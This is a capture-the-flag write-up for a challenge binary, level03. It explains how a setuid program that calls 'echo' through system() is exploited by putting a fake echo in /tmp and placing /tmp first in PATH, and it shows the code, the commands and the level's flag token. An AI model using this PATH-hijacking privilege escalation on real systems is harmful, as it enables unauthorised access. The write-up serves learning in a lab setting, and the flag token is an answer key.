@@ -1,0 +1,73 @@
+Here we have a binary called level03, we can see that it is the only file
+that has the rights of flag03 user.
+
+There is multiple way to analyze and exploit a binary, for exemple the
+buffer overflow method. Here this method would not work because 
+the program doesn't prompt the user so it will be useless.
+
+To analyze a binary we can use several commands, for exemples :
+- file: isplays the type of file, including the file format, architecture, and byte order.
+- objdump -x -s: displays information about the binary file, including the file headers, sections, symbols, and disassembled machine code
+- strings: This command displays printable strings in the binary file.
+
+When we execute the program, it only display "Exploit me"
+
+Here the strings commands show use this line:
+"/usr/bin/env echo Exploit me"
+
+It is actually the moment where "Exploit me" is printed,
+but it is actually done using the echo shell command,
+maybe using system() function.
+
+https://failingsilently.wordpress.com/2017/09/08/exploiting-calls-to-system/
+
+Thanks to this article I understood how to exploit binaries that calls
+the system function.
+
+It is done by placing our executable that is called the same as the program calls it,
+in our case "echo" and placing its path on the PATH env variable.
+
+So that it find our executable before the real one.
+
+Imagine this PATH variable: "/usr/local/bin:/usr/bin:/bin"
+
+When calling system("echo") in a program, it will search for an executable
+in the PATH variable, in the order given.
+So first in the /usr/local/bin folder, then in the /usr/bin folder, etc...
+
+Now if we add a folder like "/tmp" in front of the PATH variable, it will
+search in the /tmp folder before the /bin folder where the real echo is present.
+
+And we just have to create our own echo program that does whatever we want to execute.
+The funny part is that, as we saw before, the level03 program has the flag03 rights ;)
+
+So if we could run the getflag command through level03, we could get the flag!
+
+Solution:
+- Let's create our own program that will replace the echo executable
+
+~$ cd /tmp
+~$ touch fake_echo.c
+
+```
+#include <stdlib.h>
+
+int	main(void)
+{
+	system("getflag");
+	return 0;
+}
+```
+
+- Compile it and name it echo:
+
+~$ gcc fake_echo.c -o echo
+
+- Now add the /tmp folder to the PATH env variable
+
+~$ export PATH=/tmp:$PATH
+
+- Then execute level03
+
+~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
